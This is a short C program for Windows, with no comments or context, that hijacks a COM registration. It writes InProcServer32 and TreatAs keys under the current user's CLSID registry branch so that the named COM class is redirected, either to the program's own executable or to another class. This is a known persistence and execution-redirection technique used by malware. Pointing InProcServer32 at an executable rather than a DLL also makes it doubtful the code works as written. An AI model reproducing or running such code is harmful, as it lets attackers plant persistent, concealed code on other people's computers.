#include <windows.h>
#include <shlobj.h>

int main() {
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InProcServer32", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
    RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)"Apartment", 10);
    RegCloseKey(hKey);
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\TreatAs", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)"{1f3427c8-5c10-4210-aa03-2ee45287d668}", 39);
    RegCloseKey(hKey);
    return 0;
}
